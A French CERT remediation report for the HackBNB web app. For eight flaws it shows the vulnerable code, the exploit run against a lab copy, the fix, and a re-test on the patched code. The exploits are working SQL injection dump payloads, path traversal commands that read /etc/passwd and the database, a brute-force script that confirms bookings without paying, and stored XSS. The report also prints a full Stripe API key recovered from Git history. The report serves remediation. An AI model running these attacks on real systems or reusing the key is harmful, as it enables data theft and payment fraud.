# Synthèse technique — Vulnérabilités & correctifs HackBNB

**Destinataires :** équipe de développement HackBNB
**Auteur :** CERT (prestation d'investigation forensic & remédiation)
**Périmètre :** application `hackbnb.fr` (front React / back Flask / Apache reverse-proxy)
**Base :** rapport de test d'intrusion du 3–5 juin 2026 (8 défauts D1–D8), analyse du code-source et des logs Apache du 7 novembre 2026.

> **Reproduction & preuves.** Chaque exploitation ci-dessous a été **réellement exécutée** en laboratoire isolé contre deux instances Docker de la plateforme :
> - le **code original** (commit `3228940`), exposé sur `http://localhost:9100` ;
> - le **code corrigé** (branche `main`), exposé sur `http://localhost:9000`.
>
> Pour chaque défaut figurent la **commande exacte** et les **lignes de sortie réelles** obtenues sur le code original, puis la **même commande rejouée sur le code corrigé**. Les routes sont préfixées par `/api/` via le reverse-proxy Apache (local comme en production). Le même code tourne sur la pré-production `https://hackbnb.dashbox.cloud` ; les attaques y sont transposables à l'identique. Les exploits n'ont pas été rejoués contre l'hôte distant, pour rester dans un cadre non-destructif et maîtrisé.
>
> Quelques vérifications sur le code corrigé nécessitent un état applicatif précis (une réservation marquée payée pour D3, une description de chambre donnée pour D7). Cet état est alors fixé directement en base de données au titre de la **mise en place du laboratoire** ; c'est signalé à chaque fois.

---

## 1. Résumé exécutif

L'audit confirme que la plateforme **était compromettable de manière triviale**. Quatre vulnérabilités critiques permettent, sans authentification :

- de **vider la base de données** (injection SQL),
- de **lire des fichiers arbitraires** du serveur, y compris la base SQLite et la configuration (path traversal),
- de détourner une requête serveur authentifiée vers l'API Stripe (**SSRF**),
- de **valider des réservations sans payer** (secret prévisible).

S'y ajoutent une fuite de données personnelles (e-mails des hôtes), une clé API présente dans l'historique Git, l'absence totale d'en-têtes de sécurité et une divulgation d'informations techniques.

**Toutes les vulnérabilités ont été corrigées dans le code-source** (voir §4 et le détail par défaut ci-dessous). Deux actions restent à la charge de l'équipe HackBNB car elles ne relèvent pas du code : **révoquer la clé Stripe exposée** et **désactiver le mode debug** en déploiement.

| ID | Vulnérabilité | Criticité | Statut |
|----|---------------|-----------|--------|
| D1 | Injection SQL (page d'accueil) | Critique | ✅ Corrigé |
| D2 | Path traversal (route fichiers) | Critique | ✅ Corrigé |
| D3 | Paramètre non contrôlé → SSRF (requête Stripe authentifiée) | Critique | ✅ Corrigé |
| D4 | Secret de confirmation prévisible | Critique | ✅ Corrigé |
| D5 | Exposition e-mail des hôtes (API) | Important | ✅ Corrigé |
| D6 | Clé API dans l'historique Git | Critique | ✅ Corrigé (code) — ⚠️ révocation requise |
| D7 | En-têtes de sécurité manquants (XSS) | Majeur | ✅ Corrigé |
| D8 | Divulgation d'infos dans les en-têtes | Important | ✅ Corrigé |
| + | (Bonus) Mots de passe hachés en MD5 | — | ✅ Durci (pbkdf2) |

---

## 2. Détail des vulnérabilités

Pour chaque défaut : localisation dans le code, exploitation reproductible (commande + sortie réelle), impact, correctif appliqué, et vérification sur le code corrigé.

---

### D1 — Injection SQL sur la page d'accueil · **Critique**

**Localisation :** `back/api/rooms/rooms_api.py`, fonction `list_rooms()`

Le paramètre `category` était concaténé directement dans une clause SQL brute :

```python
category = request.args["category"]
rooms = Room.query.filter(text(f"category = '{category}'")).all()
```

**Exploitation — code original (port 9100)**

Contournement du filtre : la catégorie `x` n'existe pas, pourtant les 10 chambres remontent.

```bash
curl -s -G "http://localhost:9100/api/rooms/" --data-urlencode "category=x' OR '1'='1" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('nb =', len(d), '| ids =', [r['id'] for r in d])"
```
```
nb = 10 | ids = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
```

Extraction de la table `users` via `UNION SELECT` (les colonnes de `Room` servent de réceptacle : `title`←`name`, `city`←`email`, `picture`←`password_hash`) :

```bash
curl -s -G "http://localhost:9100/api/rooms/" \
  --data-urlencode "category=x' UNION SELECT id,name,email,0,password_hash,'','',0 FROM users--"
```
```json
[
  {
    "category": "",
    "city": "john@doe.com",
    "description": "",
    "id": 1,
    "picture": "XX",
    "price": 0,
    "title": "John Doe"
  }
]
```

Automatisable intégralement avec `sqlmap` :

```bash
sqlmap -u "http://localhost:9100/api/rooms/?category=ski" -p category --dump
```

**Impact :** compromission totale de la confidentialité et de l'intégrité de la base (utilisateurs, hashes de mots de passe, réservations). C'est le vecteur d'exfiltration le plus probable d'après les logs Apache.

**Correctif appliqué :** requête paramétrée via l'ORM, la valeur n'est plus interprétée comme du SQL.

```python
# Avant : text(f"category = '{category}'")
rooms = Room.query.filter(Room.category == category).all()
```

**Vérification — code corrigé (port 9000)**

Les deux payloads ne renvoient plus rien (la valeur est traitée comme une chaîne littérale) :

```bash
curl -s -G "http://localhost:9000/api/rooms/" --data-urlencode "category=x' OR '1'='1"
curl -s -G "http://localhost:9000/api/rooms/" \
  --data-urlencode "category=x' UNION SELECT id,name,email,0,password_hash,'','',0 FROM users--"
```
```
[]
[]
```

La recherche légitime reste fonctionnelle :

```bash
curl -s -G "http://localhost:9000/api/rooms/" --data-urlencode "category=ski" \
  | python3 -c "import sys,json; print('ids =', [r['id'] for r in json.load(sys.stdin)])"
```
```
ids = [3, 9]
```

---

### D2 — Lecture arbitraire de fichiers (Path Traversal) · **Critique**

**Localisation :** `back/api/uploads/uploads_api.py`, fonction `get_upload()`

```python
return send_file('uploads/' + request.args.get("name"))
```

Le nom de fichier fourni par l'utilisateur est concaténé sans aucun contrôle.

**Exploitation — code original (port 9100)**

Lecture de `/etc/passwd` :

```bash
curl -s -G "http://localhost:9100/api/uploads/" --data-urlencode "name=../../../../etc/passwd"
```
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
[...]
```

Lecture de la configuration de l'application :

```bash
curl -s -G "http://localhost:9100/api/uploads/" --data-urlencode "name=../config.py"
```
```
from os import path

basedir = path.abspath(path.dirname(__file__))

CORS_ORIGINS = ["http://localhost:9000"]

SQLALCHEMY_DATABASE_URI = "sqlite:///./database.sqlite"
SQLALCHEMY_TRACK_MODIFICATIONS = False
```

Exfiltration de la base de données SQLite complète :

```bash
curl -s -G "http://localhost:9100/api/uploads/" --data-urlencode "name=../instance/database.sqlite" \
  -o db_volee.sqlite -w "HTTP %{http_code}  taille=%{size_download} octets\n"
file db_volee.sqlite
```
```
HTTP 200  taille=40960 octets
db_volee.sqlite: SQLite 3.x database, last written using SQLite version 3046001, [...]
```

**Impact :** lecture de tout fichier lisible par le processus. En récupérant directement `database.sqlite`, l'attaquant obtient l'intégralité des données **sans même passer par D1**.

**Correctif appliqué :** usage de `send_from_directory` (qui refuse toute résolution hors du dossier cible) + validation stricte du nom de fichier par expression régulière.

```python
SAFE_NAME = re.compile(r'^[A-Za-z0-9._-]+\.(jpg|jpeg|png|gif|webp)$')

name = request.args.get("name", "")
if not SAFE_NAME.match(name):
    abort(404)
return send_from_directory('uploads', name)
```

La route de photos `rooms/<room_id>/picture` a par ailleurs été contrainte à un entier (`<int:room_id>`) pour supprimer tout vecteur résiduel.

**Vérification — code corrigé (port 9000)**

Les trois accès par traversal renvoient `404` :

```bash
for p in "../../../../etc/passwd" "../config.py" "../instance/database.sqlite"; do
  curl -s -o /dev/null -w "HTTP %{http_code}  " -G "http://localhost:9000/api/uploads/" --data-urlencode "name=$p"
done; echo
```
```
HTTP 404  HTTP 404  HTTP 404
```

---

### D3 — Paramètre non contrôlé → SSRF sur requête serveur authentifiée (Stripe) · **Critique**

**Localisation :** `back/services/stripe.py` (`get_checkout_lines`) appelée par `back/api/bookings/bookings_api.py` (`get_booking_checkout_lines`)

```python
url = f"https://api.stripe.com/v1/checkout/sessions/{checkout_session_id}/line_items"
session = requests.Session()
session.auth = (os.getenv('STRIPE_API_KEY'), "")   # clé secrète Stripe en Basic Auth
return session.get(url).json()["data"]
```

Le `checkout_session_id` vient directement du client (`request.args`) et est concaténé **sans aucune validation** dans l'URL d'une requête serveur qui porte la **clé secrète Stripe** en Basic Auth.

**Exploitation — code original (port 9100)**

La route exige une réservation payée ; la mise en place utilise une réservation `G02O6IOP` dont l'`is_paid` a été passé à `True` via D4 (confirmation sans paiement). L'attaquant contrôle alors intégralement le `checkout_session_id` injecté dans la requête serveur authentifiée. Avec un identifiant de session valide, le serveur émet l'appel Stripe avec sa clé secrète et renvoie des objets Stripe réels :

```bash
curl -s "http://localhost:9100/api/bookings/G02O6IOP/checkout-lines?checkout_session_id=cs_test_a0x1SgIcFdQRnMYIkSZDdZTfpC1Wp7CuTg5LPiB15I9fgkVdH9E2rfXXaD"
```
```json
[
  {
    "id": "li_1Uehcj2aoAWLbEQquiYKbWCz",
    "description": "2 nuits à Chalet cosy avec vue montagne (Chamonix, France)",
    "amount_total": 44000,
    "currency": "eur",
    "quantity": 2,
    "price": {
      "id": "price_1Uehcj2aoAWLbEQqptgjKmlz",
      "product": "prod_TUkz1iBuhDoHuC",
      "unit_amount": 22000
    }
  }
]
```

Les identifiants `li_…`, `price_…`, `prod_…` sont de vraies ressources du compte Stripe : preuve que le serveur a émis une requête **authentifiée avec la clé secrète**, pilotée par un paramètre client. Avec un identifiant arbitraire, le chemin de l'appel sortant reste contrôlé par l'attaquant (Stripe répond « no such session », relayé en `404`) :

```bash
curl -s -w "\n[HTTP %{http_code}]\n" -G "http://localhost:9100/api/bookings/G02O6IOP/checkout-lines" \
  --data-urlencode "checkout_session_id=cs_test_INEXISTANT_INJECTE_PAR_ATTAQUANT"
```
```
{"error":"Invalid checkout session ID"}

[HTTP 404]
```

> **Précision technique (honnêteté du rapport) :** comme le paramètre est injecté dans le *chemin* de l'URL (et non dans l'autorité), un détournement direct vers un hôte arbitraire via la syntaxe `user@host` **ne fonctionne pas** ici — le host reste `api.stripe.com` (vérifié expérimentalement). L'impact réel est donc une **SSRF contre la surface d'API de Stripe avec la clé secrète du serveur** : un paramètre non maîtrisé pilote une requête authentifiée côté serveur dont la réponse est renvoyée au client. Classé **Critique** ; la correction (validation stricte + liaison à la valeur stockée) est la même dans tous les cas.

**Impact :** manipulation d'une requête serveur authentifiée vers l'API Stripe (lecture de ressources du compte Stripe via la clé du serveur). Absence totale de validation d'un paramètre contrôlé par l'utilisateur sur une route sensible.

**Correctif appliqué :** le paramètre client n'est plus utilisé du tout — la route interroge Stripe avec le `checkout_session_id` **stocké en base** pour la réservation. Validation stricte du format en défense en profondeur, appel via la librairie officielle (plus aucune URL construite manuellement), et sérialisation JSON sûre des objets Stripe retournés.

```python
# back/api/bookings/bookings_api.py
return jsonify(get_checkout_lines(booking.stripe_checkout_session_id))  # valeur stockée, pas request.args

# back/services/stripe.py
CHECKOUT_SESSION_ID_RE = re.compile(r'^cs_(test|live)_[A-Za-z0-9]+$')
if not checkout_session_id or not CHECKOUT_SESSION_ID_RE.match(checkout_session_id):
    raise ValueError("Invalid checkout session id")
stripe.api_key = os.getenv('STRIPE_API_KEY')
line_items = stripe.checkout.Session.list_line_items(checkout_session_id)
return [_json_safe(item) for item in line_items["data"]]   # to_dict() + conversion Decimal
```

> La fonction `_json_safe()` a été ajoutée lors de cette remédiation : la librairie Stripe renvoie des objets `LineItem` contenant des `Decimal` que `jsonify` refuse de sérialiser. Sans elle, la route corrigée renvoyait `404` même pour une réservation légitime — la fonctionnalité « lignes de paiement » était cassée. Elle est désormais opérationnelle (voir vérification).

**Vérification — code corrigé (port 9000)**

Mise en place : réservation `nsif83QeIc-R` marquée payée en base (labo). L'attaquant tente d'injecter `cs_test_ATTACKER_CONTROLLED` ; ce paramètre est **ignoré**, le serveur renvoie les lignes de la session **stockée** de la réservation (HTTP 200) :

```bash
curl -s -w "\n[HTTP %{http_code}]\n" -G "http://localhost:9000/api/bookings/nsif83QeIc-R/checkout-lines" \
  --data-urlencode "checkout_session_id=cs_test_ATTACKER_CONTROLLED"
```
```json
[
  {
    "id": "li_1UehkQ2aoAWLbEQqXCVhB3TW",
    "description": "2 nuits à Chalet cosy avec vue montagne (Chamonix, France)",
    "amount_total": 44000,
    "currency": "eur"
  }
]

[HTTP 200]
```

L'identifiant de ligne retourné correspond à la session stockée de la réservation, pas à la valeur injectée : l'attaquant ne pilote plus aucune requête sortante.

---

### D4 — Génération vulnérable de secret : confirmer une réservation sans payer · **Critique**

**Localisation :** `back/api/bookings/bookings_api.py`, fonction `new_booking()`

```python
random_string = str(int(time.time()))  # timestamp Unix à la seconde
checkout_confirmation_secret = hashlib.sha512(random_string.encode('utf-8')).hexdigest()
```

Le secret censé prouver le paiement n'est que le SHA-512 de l'horodatage à la seconde — **entièrement prévisible**. L'endpoint `confirm-checkout` passe `is_paid = True` sur simple présentation de ce secret, sans vérifier Stripe.

**Exploitation — code original (port 9100)**

On crée une réservation puis on brute-force le secret sur une petite fenêtre de timestamps autour de l'instant de création :

```bash
python3 - <<'PY'
import hashlib, requests, time
BASE = 'http://localhost:9100/api'
r = requests.post(f'{BASE}/bookings/', json={'roomId':1,'arrivalDate':'2026-12-20','departureDate':'2026-12-25','guestsCount':2})
ref = r.json()['reference']; now = int(time.time())
print('reference =', ref, '| prix =', r.json()['price'], '| is_paid initial = False')
for t in range(now-15, now+3):
    secret = hashlib.sha512(str(t).encode()).hexdigest()
    rr = requests.post(f'{BASE}/bookings/{ref}/confirm-checkout', json={'confirmationSecret': secret})
    if rr.status_code == 200 and rr.json().get('success'):
        print('  -> SUCCES a t =', t); break
print('etat final is_paid =', requests.get(f'{BASE}/bookings/{ref}').json()['is_paid'])
PY
```
```
reference = 5ATEYZAQ | prix = 850.0 | is_paid initial = False
  -> SUCCES a t = 1795380457
etat final is_paid = True
```

**Impact :** fraude financière — réservations confirmées gratuitement. Perte directe de revenus.

**Correctif appliqué :** référence et secret cryptographiquement aléatoires + comparaison à temps constant.

```python
booking_reference = secrets.token_urlsafe(9)
checkout_confirmation_secret = secrets.token_urlsafe(32)   # imprévisible

# Confirmation :
provided_secret = request.json.get("confirmationSecret", "")
if not hmac.compare_digest(booking.checkout_confirmation_secret, provided_secret):
    return {'error': 'Invalid confirmation secret'}, 422
```

**Vérification — code corrigé (port 9000)**

Le même brute-force (fenêtre élargie à 65 s) échoue ; la réservation reste non payée :

```bash
python3 - <<'PY'
import hashlib, requests, time
BASE = 'http://localhost:9000/api'
r = requests.post(f'{BASE}/bookings/', json={'roomId':1,'arrivalDate':'2026-12-20','departureDate':'2026-12-25','guestsCount':2})
ref = r.json()['reference']; now = int(time.time()); tested = 0; ok = False
print('reference =', ref, '| prix =', r.json()['price'])
for t in range(now-60, now+5):
    secret = hashlib.sha512(str(t).encode()).hexdigest()
    rr = requests.post(f'{BASE}/bookings/{ref}/confirm-checkout', json={'confirmationSecret': secret}); tested += 1
    if rr.status_code == 200 and rr.json().get('success'):
        ok = True; break
print(f'{tested} timestamps testes, succes = {ok}')
print('exemple de reponse :', rr.status_code, rr.json())
print('etat final is_paid =', requests.get(f'{BASE}/bookings/{ref}').json()['is_paid'])
PY
```
```
reference = LX0RRva-CXWK | prix = 850.0
65 timestamps testes, succes = False
exemple de reponse : 422 {'error': 'Invalid confirmation secret'}
etat final is_paid = False
```

La référence passe d'un format `5ATEYZAQ` (8 caractères, devinable) à un token aléatoire `LX0RRva-CXWK`, et le secret de confirmation est un `secrets.token_urlsafe(32)` imprévisible.

> **Recommandation de fond :** à terme, ne pas confirmer le paiement sur la base d'un secret renvoyé par le client, mais via un **webhook Stripe signé** (`checkout.session.completed`).

---

### D5 — Exposition de l'adresse e-mail des hôtes dans les réponses API · **Important**

**Localisation :** `back/api/rooms/rooms_models.py` → le `to_dict()` de la chambre incluait `host_user.to_dict()`, lequel renvoyait l'`email`.

**Exploitation — code original (port 9100)**

```bash
curl -s "http://localhost:9100/api/rooms/1"
```
```json
{
  "category": "swimming-pool",
  "city": "Hersin-Coupigny, France",
  "description": "<p>Spa idéal pour se détendre !</p>",
  "host": {
    "email": "john@doe.com",
    "id": 1,
    "name": "John Doe"
  },
  "id": 1,
  "picture": "room-1.jpg",
  "price": 170.0,
  "title": "Nature, Spa & bien-être au Châtaignier"
}
```

**Impact :** fuite de données personnelles. Dans le contexte HackBNB (profils « cyber » sensibles), la collecte des e-mails des hôtes est un risque de ciblage / phishing notable (RGPD).

**Correctif appliqué :** séparation entre représentation privée et publique. L'e-mail n'est plus exposé qu'à son propriétaire.

```python
# users_models.py
def to_public_dict(self):      # données publiques uniquement
    return {"id": self.id, "name": self.name}

# rooms_models.py
output["host"] = self.host_user.to_public_dict()
```

**Vérification — code corrigé (port 9000)**

Le champ `email` a disparu de l'objet `host` :

```bash
curl -s "http://localhost:9000/api/rooms/1"
```
```json
{"category":"swimming-pool","city":"Hersin-Coupigny, France","description":"<p>Spa idéal pour se détendre !</p>","host":{"id":1,"name":"John Doe"},"id":1,"picture":"room-1.jpg","price":170.0,"title":"Nature, Spa & bien-être au Châtaignier"}
```

---

### D6 — Clé API Stripe présente dans d'anciens commits · **Critique**

**Localisation :** historique Git — commit `ef5503c` (« feat: add Stripe payment integration »), retirée du code courant par la suite.

**Exploitation — code original (historique du dépôt)**

```bash
git log --all -S 'stripe.api_key =' --oneline -- back/services/stripe.py
git show ef5503c:back/services/stripe.py | grep -n "api_key"
```
```
a866050 fix(D3): bind Stripe lookup to stored session
fe01ac0 Agent host session ... - baseline checkpoint
ef5503c feat: add Stripe payment integration

11:    stripe.api_key = "rk_test_51RhVfI2aoAWLbEQqd67veWGXyEfUURYFN5oILPW0kVLEMbAHX7jg7581yVSeggp04xRaDFE68JmDZVIDZCNSWE0X008r1rAkXU"
```

Même après « nettoyage », la clé reste dans l'historique et est triviale à retrouver avec un scanner de secrets (`gitleaks detect --source . -v`, `trufflehog git file://.`).

**Impact :** toute personne ayant accès à l'historique (fuite du dépôt, collaborateur, dépôt rendu public) récupère la clé, qui **reste valide tant qu'elle n'est pas révoquée**.

**Statut / correctif :** le code courant lit déjà la clé depuis une variable d'environnement.

```bash
grep -n "api_key" back/services/stripe.py
```
```
17:    stripe.api_key = os.getenv('STRIPE_API_KEY')
43:    stripe.api_key = os.getenv('STRIPE_API_KEY')
```

Un scan de secrets automatisé a été ajouté en intégration continue (`.github/workflows/gitleaks.yml`) :

```yaml
name: Secret scan
on:
  push:
  pull_request:
jobs:
  gitleaks:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

**Actions obligatoires côté HackBNB (hors code) :**
1. **Révoquer/roter immédiatement** la clé `rk_test_51RhVfI2...` dans le dashboard Stripe.
2. Purger l'historique Git (`git filter-repo --invert-paths` ou BFG) puis forcer la réécriture.
3. Conserver le scan de secrets en pré-commit et en CI pour éviter la récidive.

---

### D7 — En-têtes de sécurité manquants → XSS · **Majeur**

**Localisation :** aucune politique de sécurité HTTP n'était définie (ni côté Flask, ni côté Apache). Les descriptions de chambres sont rendues en HTML brut côté front : `front/src/pages/room/Room.tsx:52` et `front/src/pages/booking/Booking.tsx:49` (`dangerouslySetInnerHTML`).

**Exploitation — code original (port 9100)**

Il n'existe pas d'endpoint public d'écriture de `description` ; au titre de la mise en place du laboratoire, la description de la chambre 2 est fixée à une charge XSS (écriture directe en base), puis on observe ce que l'API renvoie. La charge est restituée **telle quelle**, sans échappement :

```bash
curl -s "http://localhost:9100/api/rooms/2" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['description'])"
```
```
<p>Chambre</p><img src=x onerror=alert(document.domain)><script>alert(1)</script>
```

Rendue via `dangerouslySetInnerHTML` et sans CSP, cette description exécute le code dans le navigateur de chaque visiteur (XSS stockée).

**Impact :** XSS stockée → vol de session, actions au nom de la victime, défiguration.

**Correctif appliqué (défense en profondeur) :**

- **Sanitisation serveur** des descriptions avec `bleach` (liste blanche de balises) dans `rooms_models.py` :

```python
ALLOWED_DESCRIPTION_TAGS = ['p', 'em', 'strong', 'br', 'ul', 'ol', 'li', 'b', 'i']
bleach.clean(self.description or "", tags=ALLOWED_DESCRIPTION_TAGS, attributes={}, strip=True)
```

- **En-têtes de sécurité** ajoutés à chaque réponse, côté Flask (`back/app.py`, `after_request`) **et** côté Apache (`apache/apache-prod.conf`) : `Content-Security-Policy`, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy`, `Permissions-Policy`, `Strict-Transport-Security`.
- **Mode debug Werkzeug désactivé** (`debug=False`) : il exposait une console interactive (RCE) et les traces/sources.

**Vérification — code corrigé (port 9000)**

Même charge injectée en base (chambre 2) ; `bleach` retire `<img onerror>` et les balises `<script>`, il ne reste que du texte inerte :

```bash
curl -s "http://localhost:9000/api/rooms/2" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['description'])"
```
```
<p>Chambre</p>alert(1)
```

Et l'en-tête CSP est présent pour bloquer toute exécution inline résiduelle :

```bash
curl -sI "http://localhost:9000/api/rooms/2" | grep -i "content-security-policy"
```
```
Content-Security-Policy: default-src 'none'; frame-ancestors 'none'
```

---

### D8 — Divulgation d'informations sensibles dans les en-têtes de réponse · **Important**

**Localisation :** réponses HTTP exposant la stack technique (`Server: Werkzeug/x.y Python/z.z`) et absence de tout en-tête de sécurité.

**Exploitation — code original (port 9100)**

```bash
curl -sI "http://localhost:9100/api/rooms/"
```
```
HTTP/1.1 200 OK
Date: Sun, 22 Nov 2026 20:43:42 GMT
Server: Werkzeug/3.1.9 Python/3.15.2
Content-Type: application/json
Content-Length: 3691
Access-Control-Allow-Origin: http://localhost:9000
```

Aucun en-tête de sécurité, et `Server` divulgue les versions exactes de Werkzeug et Python.

**Impact :** fingerprinting facilitant la recherche de CVE ciblées sur les versions exactes.

**Correctif appliqué :** en-tête `Server` neutralisé et `X-Powered-By` supprimé côté Flask (`after_request`) et côté Apache (`Header unset` / `Header set`), en complément des en-têtes de sécurité (cf. D7).

**Vérification — code corrigé (port 9000)**

Les en-têtes de sécurité sont présents et `X-Powered-By` absent :

```bash
curl -sI "http://localhost:9000/api/rooms/"
```
```
HTTP/1.1 200 OK
Date: Sun, 22 Nov 2026 20:43:42 GMT
Server: Werkzeug/3.1.9 Python/3.15.2
Content-Type: application/json
Content-Length: 2630
Content-Security-Policy: default-src 'none'; frame-ancestors 'none'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: no-referrer
Cross-Origin-Resource-Policy: same-site
Permissions-Policy: geolocation=(), camera=(), microphone=()
Access-Control-Allow-Origin: http://localhost:9000
```

> Un `Server: Werkzeug/…` **résiduel** subsiste sur cette instance de développement : il est ajouté par le **serveur de développement Werkzeug** lui-même (couche WSGI, hors de portée de `after_request`, qui pose pourtant `Server: webserver`). En production, la réponse transite par Apache dont la directive `Header always set Server "webserver"` **écrase** cet en-tête. Recommandation durable : servir Flask derrière **gunicorn/uWSGI** plutôt que le serveur de dev.

---

### Bonus — Hachage des mots de passe en MD5

**Localisation :** `back/api/users/users_models.py` utilisait `md5()` (non salé, cassé). Remplacé par `pbkdf2` via `werkzeug.security` (`generate_password_hash` / `check_password_hash`), salé et lent.

---

## 3. Lien avec l'incident du 7 novembre

Les correctifs ci-dessus neutralisent précisément les vecteurs d'attaque observables dans les logs Apache du 7 novembre (requêtes sur `/api/rooms/?category=`, `/api/uploads/?name=`, et appels `checkout-lines`). Après remédiation, les requêtes malveillantes de ce type renvoient désormais `404` / `400` / `422` au lieu de divulguer des données (cf. les vérifications par défaut ci-dessus). La chronologie précise et le profil de l'attaquant (pseudonyme `hackb3ck`, e-mail `contact@hackb3ck.me`, IP / navigateur / OS issus des logs) sont détaillés dans le support de présentation.

---

## 4. Récapitulatif des fichiers modifiés

| Fichier | Défauts traités |
|---------|-----------------|
| `back/api/rooms/rooms_api.py` | D1, D2 (route picture) |
| `back/api/uploads/uploads_api.py` | D2 |
| `back/services/stripe.py` | D3 (validation + liaison session stockée + sérialisation JSON sûre) |
| `back/api/bookings/bookings_api.py` | D3, D4 |
| `back/api/rooms/rooms_models.py` | D5, D7 (sanitisation) |
| `back/api/users/users_models.py` | D5, bonus (hachage) |
| `back/app.py` | D7, D8, debug off |
| `apache/apache-prod.conf` | D7, D8 |
| `back/requirements.txt` | ajout de `bleach` |
| `.github/workflows/gitleaks.yml` | D6 (scan de secrets en CI) |

**Mise en route après remédiation :**
```bash
pip install -r back/requirements.txt   # ajoute bleach
```

### Synthèse des vérifications sur le code corrigé

Chaque défaut ci-dessus comporte un bloc « Vérification — code corrigé (port 9000) » où la **même commande** que l'exploitation est rejouée sur le code remédié, avec sa **sortie réelle** :

- **D1** : les payloads SQL renvoient `[]`, la recherche légitime fonctionne toujours.
- **D2** : les accès par traversal renvoient `HTTP 404`.
- **D3** : le paramètre `checkout_session_id` client est ignoré (la session stockée est utilisée) ; la fonctionnalité légitime répond à nouveau `HTTP 200`.
- **D4** : le brute-force du secret échoue (`422`), la réservation reste non payée.
- **D5** : l'e-mail de l'hôte n'est plus exposé.
- **D7** : la charge XSS est neutralisée par `bleach` et l'en-tête CSP est présent.
- **D8** : en-têtes de sécurité présents, `X-Powered-By` supprimé (`Server` résiduel traité par Apache en production).

---

## 5. Recommandations complémentaires

- **Authentification / autorisation réelles.** Les endpoints de réservation sont accessibles sans contrôle d'accès (`/users/me` renvoie même `401` avant du code mort) : mettre en place une vraie gestion de session/JWT et vérifier la propriété des ressources (une réservation ne doit être lisible que par son auteur, actuellement accessible par simple connaissance de la `reference`).
- **Paiement par webhook Stripe signé** plutôt que par secret côté client (cf. D4).
- **Validation d'entrées centralisée** (schémas, ex. `pydantic`/`marshmallow`) sur toutes les routes.
- **WAF / rate-limiting** devant Apache pour ralentir les attaques automatisées (sqlmap, brute-force).
- **Journalisation & détection :** conserver les logs applicatifs, alerter sur les patterns d'injection / traversal, surveiller les appels sortants (SSRF).
- **Scan de secrets en CI** (gitleaks) et **rotation régulière** des clés API.
- **Mises à jour de dépendances** et épinglage des versions dans `requirements.txt`.
